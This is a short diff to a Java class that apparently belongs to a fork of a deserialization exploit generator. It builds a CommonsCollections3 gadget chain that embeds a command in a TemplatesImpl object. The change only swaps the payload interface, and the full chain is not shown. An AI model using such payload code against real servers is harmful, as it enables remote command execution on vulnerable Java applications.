@@ -13,7 +13,7 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InstantiateTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
@@ -29,7 +29,8 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 @SuppressWarnings({"rawtypes", "unchecked", "restriction"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.FROHOFF})
-public class CommonsCollections3 implements ObjectPayload<Object> {
+public class CommonsCollections3 implements CommandObjectPayload<Object>
+{
 
 	public Object getObject(final String command) throws Exception {
 		Object templatesImpl = Gadgets.createTemplatesImpl(command);
